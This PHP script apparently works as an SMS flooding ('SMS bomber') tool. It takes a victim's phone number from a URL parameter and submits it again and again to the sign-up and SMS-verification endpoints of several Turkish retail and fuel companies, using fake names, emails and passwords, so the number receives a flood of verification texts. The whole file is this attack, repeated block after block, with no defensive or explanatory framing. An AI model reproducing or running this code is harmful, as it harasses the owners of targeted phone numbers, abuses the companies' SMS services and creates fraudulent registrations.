        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
